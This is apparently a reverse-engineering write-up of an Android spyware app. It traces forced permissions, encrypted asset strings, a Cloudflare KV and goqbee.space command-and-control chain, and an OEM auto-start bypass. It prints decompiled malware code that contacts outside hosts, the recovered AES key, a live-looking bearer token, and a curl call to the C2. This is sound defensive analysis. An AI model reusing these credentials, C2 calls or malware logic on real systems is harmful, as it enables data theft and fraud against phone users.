## Lets first analyse the activites and services present in the app using JADX. 

We see multiple activites and service and few stand very suspicious :

![images](images/susAct.png)

## Let's have a look at the permissions requested by the app in the Manifest file:

![images](images/manifestPerms.png)

This app requests an unusually large number of permissions, many of which are highly invasive and typical of spyware, banking trojans, or surveillance malware.

![images](images/susPerms.png)

1) The above permissions are very common in malwares to do the listed actions. 

2) Also there are below permissions which if may lead to potential frauds : 

![images](images/susPerms2.png)

## Now let's breakdown the MainActivity :

![images](images/ManifestMA.png)

```
private boolean areAllPermissionsGranted() {
        return fj.a(this, "android.permission.READ_CONTACTS") == 0 && fj.a(this, "android.permission.CALL_PHONE") == 0 && fj.a(this, "android.permission.READ_SMS") == 0 && fj.a(this, "android.permission.RECEIVE_SMS") == 0 && fj.a(this, "android.permission.SEND_SMS") == 0;
    }
```

- Makes sure that the above permissions are given before starting the app , if these permissions aren't given then the user cannot use the app (**THE USER IS FORCED TO TURN ON THE PERMISSIONS**)


- If we check the "usage" of the function, it is used in the method `requestPermissions`, which is called in the OnCreate method.

![image](images/permissionfuncUsage.png)
![image](images/OnCreate.png)

- If the permissions are all given , it calls another method `fetchAppConfiguration`.

Let's look into the fetchAppConfiguration method :

```
private void fetchAppConfiguration() {
        try {
            String address = deviceUtils.getAddress();
            String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());
            final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
            asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
            asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
            asyncHttpClient.get(address, new AsyncHttpResponseHandler() { // from class: com.errorforcode.netix.MainActivity.1
                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onFailure(int i, Header[] headerArr, byte[] bArr, Throwable th) {
                    Toast.makeText(MainActivity.this.context, "Fetch address error: " + i, 1).show();
                    MainActivity.this.finish();
                }

                @Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
```
- This is a pretty suspicious function because of the following reasons :

![images](images/fakeURLget.png)

- If we go to the definition of the `deviceUtils.getAddress` definition : 

```
 public String getAddress() throws Exception {
        StringBuilder sb = new StringBuilder("https://");
        String decrypt = AESEncrypt.decrypt(readAssets("core.txt"), Decrypt.getSecretKey());
        String decrypt2 = AESEncrypt.decrypt(readAssets("acc.txt"), Decrypt.getSecretKey());
        String decrypt3 = AESEncrypt.decrypt(readAssets("ns.txt"), Decrypt.getSecretKey());
        sb.append(decrypt);
        sb.append("/client/v4/accounts/");
        sb.append(decrypt2);
        sb.append("/storage/kv/namespaces/");
        sb.append(decrypt3);
        sb.append("/values/test");
        return sb.toString();
    }
```
We see that the URL is being extracted from various files from the `assets` folder and then decrypted using a secret key. 

Let's try to find the URL: 

The contents in the :

- core.txt : Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF
- acc.txt : 0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A==
- ns.tst : i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg==

Now, lets try to find the secret key : 

![image](images/keynative.png)

Below is the Frida Script to find the secret key from the native file (**libnetix.so**):

```
Java.perform(function () {
    const Decrypt = Java.use("com.errorforcode.netix.Utils.Encrypt.Decrypt");
    const nativeGetSecretKey = Module.findExportByName("libnetix.so", "Java_com_errorforcode_netix_Utils_Encrypt_Decrypt_getSecretKey");
    
    if (nativeGetSecretKey) {
        Interceptor.attach(nativeGetSecretKey, {
            onLeave: function (retval) {
                const env = Java.vm.getEnv();
                const key = env.getStringUtfChars(retval, null).readCString();
                console.log("\n[+] REAL SECRET KEY:", key, "\n");       
            }
        });
    } else {
        console.error("[-] Error: libnetix.so or getSecretKey() not found!");
    }
});
```

![image](images/secretKey.png)

`&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C` -> This is the secret key.

Once the key is found , we can decrypt the URL specified. he python script for the same is mentioned below.

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_aes(encrypted_data, key):
    encrypted_bytes = base64.b64decode(encrypted_data)
    key_bytes = key.encode('utf-8')
    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    return decrypted.decode('utf-8')

key = "&hX2aJ7$SdfW8!zQ9uB1Yx4LmN$XvG8C"
core_enc = "Mn6J47+7OPh5Oev9UkTH5MgASX+WlZSOeIjODT0C5pXGF6iwsTh28tTdh74zqBWF"
acc_enc = "0p1SEi9/UkhuMhUGx+2aEvOJ+IioKHaw5nQNHqyo6hghj9+lE1EcLCS202UN40ZRqYyfOrbuIiyJ5cKVOdU79A=="
ns_enc = "i8BzP5dpLusLyVaMQfyT9GT3JkMNNUJEYKEG9KYIkECid2rLn3PL+H1TGaNdHF406tjdEMBHTHLoiEr9zsParg=="

try:
    core_decrypted = decrypt_aes(core_enc, key)
    acc_decrypted = decrypt_aes(acc_enc, key)
    ns_decrypted = decrypt_aes(ns_enc, key)
    url = f"https://{core_decrypted}/client/v4/accounts/{acc_decrypted}/storage/kv/namespaces/{ns_decrypted}/values/test"
    
    print("Decrypted Values:")
    print(f"core.txt: {core_decrypted}")
    print(f"acc.txt: {acc_decrypted}")
    print(f"ns.txt: {ns_decrypted}")
    print("\nConstructed URL:")
    print(url)

except Exception as e:
    print(f"Decryption failed: {str(e)}")
    print("Possible reasons:")
    print("- Incorrect key")
    print("- Different AES mode was used (e.g., ECB instead of CBC)")
    print("- Different padding scheme")
    print("- IV handling might be different in the original implementation")
```

The output url is :

**https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test**

- This is a very suspiious URL, which likely stores the stolen details. `/storage/kv/namespaces/` is Cloudflare's key-value storage API.
- Malware uses this to store stolen data persistently.

Let's go back to where we left in the MainActivity : 

`String decrypt = AESEncrypt.decrypt(deviceUtils.readAssets("api.txt"), Decrypt.getSecretKey());`

The `decrypt` variable can be found by using the same python script as above, as the same `key` is used for decryption.

api.txt - rP79AifBcvxyHj9gInpNur3vjnnyCMK52cuMHmMUBAW9jxDSTYTAUP1gPtcfb5auT2Bps11yF1/pHPw6Dpfp6w==

`decrypt - xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF`

```
final AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
asyncHttpClient.addHeader("Content-Type", RequestParams.APPLICATION_JSON);
asyncHttpClient.addHeader("Authorization", "Bearer " + decrypt);
```

- In general, standard apps use `HttpURLConnection` or `OkHttpClient`, and Headers are typically minimal and well-documented.
- Here, there is use of a deprecated library which is known for security vulnerabilities, and is often used in malware due to its simple async handling.
- Here, the value of `decrypt` that we found out is used as the `Bearer Token`. Generally, these API tokens are properly OAuth-generated.
- There are also missing security headers in this : 
    - No `User-Agent` 
    - No `X-Requested-With`
    - No certificate pinning (**Man in the middle attacks is very much possible**)

```
@Override // com.loopj.android.http.AsyncHttpResponseHandler
                public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                    try {
                        String decrypt2 = AESEncrypt.decrypt(new String(bArr), Decrypt.getSecretKey());
                        MainActivity.database.setString(ClientCookie.DOMAIN_ATTR, decrypt2);
                        MainActivity.database.setString("icon", "Normal");
                        MainActivity.this.fetchConfiguration(asyncHttpClient, "https://" + decrypt2 + "/users/" + MainActivity.deviceUtils.readAssets("port.txt") + "/config");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
```
- now there is another URL which is trying to load, let's decode to see what URL this is.
- If we see the usage of the `OnSucess` method, it takes the output returned by the firsl URL and decrypts it , to save it in the vairable `decrypt2`.
- The domain of the url is saved in the app database, maybe so that the app remembers from when to execute the orders from even after phone restart.

Let's see what does `https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test` return : 

```
curl -X GET   "https://api.cloudflare.com/client/v4/accounts/3667505da85673d21e3204b3d7c5f313/storage/kv/namespaces/356bccff1a3747cc815a5bcb8a5609cd/values/test"   -H "Authorization: Bearer xRnT8VHZvt-dZbA3WDUk0IWPrr8yfu9CmpMWSjIF"   -H "Content-Type: application/json"
```

And we successfully get an encrypted output : `oX2m51CiKpsKMG4pEqMbN+JscM3FsuWnohtXf9ClwDTC967Qe6hTQWduWEWGz4I1`

- This can be decrypted using the same python file that we used to decrypt the other, because the same key is used to decrypt everything. 
- Once the py file is run with this encrypted URL, we get the domain **www.goqbee.space**.
- port.txt -> `-1002254644684`

Now the new constructed URL would be: **https://www.goqbee.space/users/-1002254644684/config**

When we try to open the URL, we get something like this:

![images](images/goqbee.png)

- Let's try to decode the encrypted data of the json using the same python code ..... We get `{'webview': None, 'notification': False}`.
- This clearly shows that this is the main URL through which the attacker, sends commands for the app to steal. 

Let's move on to the next function in the MainActivity:

```
public void onSuccess(int i, Header[] headerArr, byte[] bArr) {
                try {
                    JSONObject jSONObject = new JSONObject(AESEncrypt.decrypt(new JSONObject(new String(bArr)).getJSONObject("parameters").getString("encrypted"), Decrypt.getSecretKey()));
                    NetixCore.install();
                    MainActivity.database.setString("webview", jSONObject.getString("webview"));
                    MainActivity.database.setString("notification", jSONObject.getString("notification"));
                    MainActivity mainActivity = MainActivity.this;
                    mainActivity.webView = (WebView) mainActivity.findViewById(R.id.webView);
                    MainActivity mainActivity2 = MainActivity.this;
                    mainActivity2.progressBar = (ProgressBar) mainActivity2.findViewById(R.id.progressBar);
                    MainActivity.this.webView.getSettings().setJavaScriptEnabled(true);
                    MainActivity.this.webView.getSettings().setDomStorageEnabled(true);
                    MainActivity.this.webView.setWebViewClient(new WebViewClient() { // from class: com.errorforcode.netix.MainActivity.2.1
                        @Override // android.webkit.WebViewClient
                        public void onPageFinished(WebView webView, String str2) {
                            MainActivity.this.progressBar.setVisibility(8);
                            MainActivity.this.webView.setVisibility(0);
                        }

                        @Override // android.webkit.WebViewClient
                        public void onPageStarted(WebView webView, String str2, Bitmap bitmap) {
                            MainActivity.this.progressBar.setVisibility(0);
                            MainActivity.this.webView.setVisibility(8);
                        }
                    });
                    String string = jSONObject.getString("webview");
                    if (string.endsWith("/")) {
                        MainActivity.this.webView.loadUrl(string);
                        return;
                    }
                    MainActivity.this.webView.loadUrl(string + "?androidid=" + NetixCore.getAndroidId());
                    NetixCore.getAndroidId();
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
```

- The jsonObject stores the json output that we get from the mainURL.
- `NetixCore.install()`
    - Steals the device's **Firebase Cloud Messaging (FCM) token**.
    - Enables push notifications attacks(even if the app is closed).
    - Creates a unique victim profile for targeted attacks.
    - Evades detection by adapting to device specifics.
    - The data that is sent to the malicious URL is encrypted to hide the data from network monitors.
    - `database.setString("install", "true");`, this survives app updates/reboots.
- The databse sets 2 new fields, webview and notification, to store the current status of the mainURL.
- Creates a webview and a progressbar which changes based on the page being loaded. 
- The variable `string` stores the malicious webpage that is provided by the URL : **https://www.goqbee.space/users/-1002254644684/config**
- It loads the webURL secretly attaching your device ID ... the URL would look something like this : `https://phishing-site.com/login?androidid=2b9a14c3f58a1d42`


Let's move on to the next method `handleAutoStartPermission()`:

```
private void handleAutoStartPermission() {
        i9.b.getClass();
        final i9 i9Var = (i9) i9.c.a();
        Context context = this.context;
        i9Var.getClass();
        d31.k(context, "context");
        List<ApplicationInfo> installedApplications = context.getPackageManager().getInstalledApplications(0);
        d31.j(installedApplications, "pm.getInstalledApplications(0)");
        Iterator<ApplicationInfo> it = installedApplications.iterator();
        while (it.hasNext()) {
            if (i9Var.a.contains(it.next().packageName) && i9Var.c(context, false, false)) {
                try {
                    if (!database.getString("autostart").equals("true") && NetixCore.getBrand().equalsIgnoreCase("xiaomi")) {
                        database.setString("autostart", "true");
                        o3 o3Var = new o3(this);
                        ((k3) o3Var.g).d = "هشدار! برای ادامه نیاز به اعطای مجوز به برنامه دارید.";
                        String str = "برای ادامه لطفا روی دکمه 'فهمیدم' کلیک کنید و در تنظیمات گزینه auto start یا اغاز خودکار پس زمینه را برای برنامه '" + deviceUtils.getApplicationName() + "' فعال کنید.\n\n\nتوجه! در صورت رد کردن یا فعال نکردن این گزینه برنامه دچار اختلال میشود.";
                        Object obj = o3Var.g;
                        ((k3) obj).f = str;
                        DialogInterface.OnClickListener onClickListener = new DialogInterface.OnClickListener() { // from class: m50
                            @Override // android.content.DialogInterface.OnClickListener
                            public final void onClick(DialogInterface dialogInterface, int i) {
                                MainActivity.this.lambda$handleAutoStartPermission$1(i9Var, dialogInterface, i);
                            }
                        };
                        k3 k3Var = (k3) obj;
                        k3Var.g = "فهمیدم.";
                        k3Var.h = onClickListener;
                        o3Var.a().show();
                        return;
                    }
                    return;
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
```

- On inspecting `i9` class, we see that it is a **manufacturer-specific auto-start permission bypass tool** that :
    - Maintains a list of OEM-specific packages (com.miui.securitycenter, com.huawei.systemmanager, etc.)
    - Contains methods to:
        - Detect device brand (c())
        - Launch OEM-specific auto-start settings activities (b(), f())
        - Verify if activities exist (e())

- `List<ApplicationInfo> installedApplications = context.getPackageManager().getInstalledApplications(0);` gets a list of all installed apps, to check the `brand` of the device.

- `i9Var.a.contains(it.next().packageName) && i9Var.c(context, false, false)` identifies manufacturer-specific security apps that control auto-start permissions.

below are the listed security apps that belong to the list, as given in the `i9` class. 

![images](images/secrityapps.png)


















